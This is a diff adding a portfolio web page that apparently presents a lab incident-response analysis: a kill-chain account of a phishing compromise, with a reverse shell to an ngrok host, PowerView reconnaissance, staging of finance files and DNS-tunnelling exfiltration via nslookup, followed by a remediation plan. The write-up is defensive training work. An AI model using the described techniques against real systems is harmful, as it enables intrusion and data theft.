+            <li class="project-details__desc-para">The repeated attempts to connect to <code>2.tcp.ngrok.io</code> (implied success by subsequent attacker actions).</li>
+            <li class="project-details__desc-para">The last log showing another attempt to establish the <code>reverse shell</code>, confirming ongoing <code>C2</code> capability (<code>06/04/2025 1:05:41.540 PM</code>).</li>
+        </ul>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">7. Actions on Objectives:</h4>
+        <p class="project-details__desc-para">What Happened: This is where the attacker achieved their primary goals: internal reconnaissance, data staging, and data exfiltration.</p>
+        <p class="project-details__desc-para">Our Evidence:</p>
+        <ul>
+            
+                
+                    <li class="project-details__desc-para">Internal Reconnaissance: Execution of <code>whoami.exe</code> and <code>systeminfo.exe</code> (<code>06/04/2025 1:00:49.540 PM</code> and <code>1:00:41.540 PM</code>).</li>
+                    <li class="project-details__desc-para">Download (<code>06/04/2025 1:01:36.540 PM</code>) and execution of <code>PowerView.ps1</code> (<code>06/04/2025 1:01:57.540 PM</code> and <code>1:02:25.540 PM</code>), along with the <code>ExecutionPolicy Bypass</code> (<code>06/04/2025 1:01:49.540 PM</code>).</li>
+                
+            
+            <li class="project-details__desc-para">Data Staging:
+                <ul>
+                    <li class="project-details__desc-para">Creation of <code>C:\Users\michael.ascot\Downloads\exfiltration</code> directory (<code>06/04/2025 1:03:24.540 PM</code>).</li>
+                    <li class="project-details__desc-para">Mapping of network share <code>\\FILESRV-01\SSF-FinancialRecords</code> as <code>Z:</code> (<code>06/04/2025 1:03:31.540 PM</code>).</li>
+                    <li class="project-details__desc-para">Copying of <code>ClientPortfolioSummary.xlsx</code> and <code>InvestorPresentation_2023.pptx</code> using <code>Robocopy.exe</code> (<code>06/04/2025 1:04:18.540 PM</code>).</li>
+                    <li class="project-details__desc-para">Compression of files into <code>exfilt8me.zip</code> (<code>06/04/2025 1:04:47.540 PM</code>).</li>
+                </ul>
+            </li>
+            <li class="project-details__desc-para">Data Exfiltration:
+                <ul>
+                    <li class="project-details__desc-para">Sending <code>exfilt8me.zip</code> data via <code>DNS tunneling</code> using <code>nslookup.exe</code> to <code>haz4rdw4re.io</code> (<code>06/04/2025 1:05:16.540 PM</code> and <code>06/04/2025 1:05:32.540 PM</code>).</li>
+                </ul>
+            </li>
+            <li class="project-details__desc-para">Defense Evasion/Cleanup:
+                <ul>
+                    <li class="project-details__desc-para">Disconnecting the network share (<code>06/04/2025 1:04:29.540 PM</code>).</li>
+                    <li class="project-details__desc-para">Attempting to terminate the <code>PowerShell</code> session (<code>Stop-Process</code> at <code>06/04/2025 1:05:41.540 PM</code>).</li>
+                </ul>
+            </li>
+            <li class="project-details__desc-para">Persistence:
+                <ul>
+                    <li class="project-details__desc-para">The attempted re-execution of the <code>powermac.ps1 reverse shell</code> (<code>06/04/2025 1:05:41.540 PM</code> and later reactivation per the incident report) signifies the establishment of a persistence mechanism.</li>
+                </ul>
+            </li>
+        </ul>
+    </li>
+</ol>
+              
+<!--- ********************************* --->
+              <!--- ********************************* --->
+
+<h3 class="project-details__content-title">Remediation and Mitigation Plan</h3>
+<p class="project-details__desc-para">Based on the detailed analysis of the attack chain and the confirmed data breach, an immediate and systematic response is critical. My proposed remediation and mitigation plan is as follows:</p>
+
+<ol>
+    <li>
+        <h4 class="project-details__content-title">Immediate Containment</h4>
+        <p class="project-details__desc-para">The very first priority is to stop the bleeding and prevent any further damage or exfiltration.</p>
+        <ul>
+            <li class="project-details__desc-para">Isolate <code>win-3450</code>: I will immediately isolate the compromised host (<code>win-3450</code>) from the network. This will prevent the attacker from maintaining control, launching further attacks internally, or exfiltrating more data.</li>
+            <li class="project-details__desc-para">Block Malicious Infrastructure: I will ensure that our network firewalls are updated to explicitly block all traffic to and from the identified attacker infrastructure: <code>haz4rdw4re.io</code> (used for <code>DNS tunneling exfiltration</code>) and <code>2.tcp.ngrok.io</code> (used for the <code>reverse shell C2</code>).</li>
+        </ul>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">Eradication & System Hardening</h4>
+        <p class="project-details__desc-para">Once contained, the next step is to remove the adversary's presence and secure the affected systems.</p>
+        <ul>
+            <li class="project-details__desc-para">Credential Reset: The <code>michael.ascot@tryhatme.com</code> account was compromised. I will reset <code>Michael Ascot</code>'s password immediately and enforce <code>multi-factor authentication (MFA)</code> on his account, and ideally for all users, to prevent future credential-based attacks.</li>
+            <li class="project-details__desc-para">Comprehensive Scanning: I will initiate a full <code>antivirus</code> and <code>anti-malware</code> scan on both the compromised <code>win-3450</code> host and the <code>FILESERV-01</code> server, ensuring all identified threats are quarantined or removed.</li>
+            <li class="project-details__desc-para">Patching and Updates: I will confirm that <code>win-3450</code> and <code>FILESERV-01</code>, along with any other potentially affected systems, have all security patches and software updates applied.</li>
+        </ul>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">Persistence Investigation & Removal</h4>
+        <p class="project-details__desc-para">It's crucial to ensure the attacker cannot regain access.</p>
+        <ul>
+            <li class="project-details__desc-para">Identify Persistence Mechanisms: A thorough <code>forensic investigation</code> on <code>win-3450</code> should be performed.</li>
+            <li class="project-details__desc-para">Remove Backdoors: Any identified persistence mechanisms (like the re-activation of <code>powermac.ps1</code>) will be immediately removed.</li>
+            <li class="project-details__desc-para">Ongoing Monitoring: I will set up enhanced monitoring for network traffic to <code>2.tcp.ngrok.io</code> and <code>haz4rdw4re.io</code> to detect any lingering or new attempts at persistent access or data exfiltration, even after blocks are in place.</li>
+        </ul>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">Prevent Future Attacks</h4>
+        <p class="project-details__desc-para">Learning from this incident is key to strengthening our defenses.</p>
+        <ul>
+            <li class="project-details__desc-para">Email Filter Enhancement: Our <code>email security gateway</code> needs immediate updates to block <code>.zip</code> files containing <code>.lnk</code> files, or at least flag them with extreme suspicion. Stricter attachment policies should be considered.</li>
+            <li class="project-details__desc-para">Phishing Awareness Training: This incident highlights a user falling victim to <code>phishing</code>. I will schedule mandatory, updated <code>phishing awareness training</code> for all employees, with a special focus on <code>michael.ascot</code> and his team, emphasizing the dangers of suspicious attachments and external links.</li>
+            <li class="project-details__desc-para">Endpoint Detection & Response (EDR) Review: I will review our <code>EDR</code> capabilities and rules to ensure better detection of <code>explorer.exe</code> spawning <code>PowerShell</code>, <code>nslookup</code> abnormal behavior, and unusual <code>Robocopy</code> usage in the future.</li>
+        </ul>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">Reporting & Communication</h4>
+        <p class="project-details__desc-para">Transparency and legal obligations must be met.</p>
+        <ul>
+            <li class="project-details__desc-para">Regulatory Reporting: I will ensure all necessary documentation is prepared for regulatory (e.g., <code>GDPR</code>, <code>CCPA</code>, etc.) reporting to comply with legal obligations regarding data breaches. In Australia, this specifically includes notifying the <code>Office of the Australian Information Commissioner (OAIC)</code> under the <code>Notifiable Data Breaches (NDB)</code> scheme if the breach is likely to result in serious harm to any individual whose personal information is involved.</li>
+            <li class="project-details__desc-para">Stakeholder Notification: All relevant internal and external stakeholders will be notified about the incident, its confirmed impact, and the steps being taken to resolve it.</li>
+        </ul>
+    </li>
+</ol>
+              
+              <!--- ********************************* --->
+
+              
+  
+            </div>
+            <div class="project-details__tools-used">
+              <h3 class="project-details__content-title">Tools Used</h3>
+              <div class="skills">
+                <div class="skills__skill">Incident Analysis & Triage</div>
+                <div class="skills__skill">Splunk SIEM</div>
+                <div class="skills__skill">SIEM Operations</div>
+                <div class="skills__skill">Understanding of TTPs</div>
+                <div class="skills__skill">Log Analysis</div>
+                <div class="skills__skill">Threat Intelligence Utilization</div>
+                <div class="skills__skill">Phishing Detection & Analysis</div>
+                <div class="skills__skill">Cyber Kill Chain Framework</div>
+                <div class="skills__skill">Security Awareness Principles</div>
+                <div class="skills__skill">Virus Total</div>
+                <div class="skills__skill">Remediation Planning & Recommendation</div>
+                <div class="skills__skill">Incident Detection</div>
+                <div class="skills__skill">Regulatory Compliance Awareness</div>
+                <div class="skills__skill">Documentation</div>
+                <div class="skills__skill">Threat Detection</div>
+                <div class="skills__skill">Incident Response</div>
+                <div class="skills__skill">Digital Forensics</div>
+                <div class="skills__skill">Endpoint Analysis</div>
+              </div>
+            </div>
+          <!--  <div class="project-details__links">
+              <h3 class="project-details__content-title">See Live</h3>
+              <a href="#" class="btn btn--med btn--theme project-details__links-btn" target="_blank">Live Link</a>
+              <a href="#" class="btn btn--med btn--theme-inv project-details__links-btn" target="_blank">Code Link</a>
+            </div> -->
+          </div>
+        </div>
+      </div>
+    </section>
+    <footer class="main-footer">
+      <div class="main-container">
+        <div class="main-footer__upper">
+          <div class="main-footer__row main-footer__row-1">
+            <h2 class="heading heading-sm main-footer__heading-sm">
+              <span>Social</span>
+            </h2>
+            <div class="main-footer__social-cont">
+              <a target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/han-yeti/">
+                <img class="main-footer__icon" src="./assets/png/linkedin-ico.png" alt="icon" />
+              </a>
+              <a target="_blank" rel="noreferrer" href="https://github.com/hanyeti">
+                <img class="main-footer__icon" src="./assets/png/github-ico.png" alt="icon" />
+              </a>
+              <!---<a target="_blank" rel="noreferrer" href="#">
+                <img class="main-footer__icon" src="./assets/png/twitter-ico.png" alt="icon" />
+              </a>-->
+              <a target="_blank" rel="noreferrer" href="https://www.youtube.com/@HYeti">
+                <img class="main-footer__icon" src="./assets/png/yt-ico.png" alt="icon" />
+              </a>
+              <!---<a target="_blank" rel="noreferrer" href="#">
+                <img class="main-footer__icon main-footer__icon--mr-none" src="./assets/png/insta-ico.png" alt="icon" />
+              </a>-->
+            </div>
+          </div>
+          <div class="main-footer__row main-footer__row-2">
+            <h4 class="heading heading-sm text-lt">Han Yeti</h4>
+            <p class="main-footer__short-desc">
+              Certified Cybersecurity Professional
+            </p>
+          </div>
+        </div>
+       
+      </div>
+    </footer>
+    <div id="image-modal" class="modal">
+      <span class="close" onclick="closeModal()">&times;</span>
+      <img id="modal-img" class="modal-content" />
+    </div>
+    <script>
+      const images = document.querySelectorAll('.constrained-image');
+      const modal = document.getElementById("image-modal");
+      const modalImg = document.getElementById("modal-img");
+
+      modal.style.display = "none";
+
+      images.forEach(img => {
+        img.onload = () => {
+          if (img.naturalWidth > 1890 || img.naturalHeight > 1100) {
+            img.classList.add('larger');
+          }
+        };
+        img.onclick = () => showOriginal(img.id);
+      });
+
+      function showOriginal(imgId) {
+        const img = document.getElementById(imgId);
+        modalImg.src = img.src;
+        modal.style.display = "flex";
+      }
+
+      function closeModal() {
+        modal.style.display = "none";
+      }
+    </script>
+  </body>
+</html>
